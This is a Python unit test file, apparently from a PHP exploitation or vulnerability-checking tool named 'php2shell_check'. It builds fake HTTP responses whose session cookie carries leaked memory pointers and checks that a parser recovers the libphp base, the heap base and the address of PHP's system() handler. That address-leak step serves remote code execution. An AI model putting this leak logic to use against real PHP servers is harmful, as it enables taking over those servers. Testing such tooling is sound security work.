import struct
import unittest
import urllib.parse

from php2shell_check import leak


def make_leak_response(dtor: int = 0x40060F7B60,
                       id_chunk: int = 0x4019200000,
                       main_chunk: int = 0x4008000000,
                       other_chunk: int = 0x4019800000) -> bytes:
    data = bytearray(b"A" * 819208)

    def put(offset: int, value: int) -> None:
        struct.pack_into("<Q", data, offset, value)

    offset = 0
    for _ in range(1095):
        put(offset, dtor)
        offset += 8
    for i in range(7495):
        put(offset, id_chunk + 0x100 + (i % 64) * 0x100)
        offset += 8
    for i in range(87):
        put(offset, main_chunk + 0x100 + (i % 64) * 0x100)
        offset += 8
    for i in range(79):
        put(offset, other_chunk + 0x100 + (i % 64) * 0x100)
        offset += 8

    encoded = urllib.parse.quote_from_bytes(bytes(data), safe="").encode()
    return b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + encoded + b"\r\n\r\n"


class LeakTests(unittest.TestCase):
    def test_recovers_bases_from_qemu_addresses(self):
        found = leak.parse_leak(make_leak_response(), 0x65EB60, 0x465370)
        self.assertEqual(found.decoded_len, 819208)
        self.assertEqual(found.dtor, 0x40060F7B60)
        self.assertEqual(found.dtor_count, 1095)
        self.assertEqual(found.libphp, 0x4005A99000)
        self.assertEqual(found.main, 0x4008000000)
        self.assertEqual(found.zif_system, 0x4005EFE370)
        self.assertEqual(found.s_addr, 0x40080F8398)

    def test_native_addresses_also_work(self):
        dtor = 0x7F9BEA2D8B60
        main = 0x7F9BE8000000
        found = leak.parse_leak(
            make_leak_response(dtor=dtor, id_chunk=0x7F9BE7800000,
                               main_chunk=main, other_chunk=0x7F9BE7600000),
            0x65EB60, 0x465370,
        )
        self.assertEqual(found.libphp, dtor - 0x65EB60)
        self.assertEqual(found.main, main)
        self.assertEqual(found.zif_system, dtor - 0x65EB60 + 0x465370)

    def test_normal_session_cookie_is_not_a_leak(self):
        raw = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" + b"a" * 32 + b"\r\n\r\n"
        with self.assertRaises(leak.LeakError):
            leak.parse_leak(raw, 0x65EB60, 0x465370)


if __name__ == "__main__":
    unittest.main()
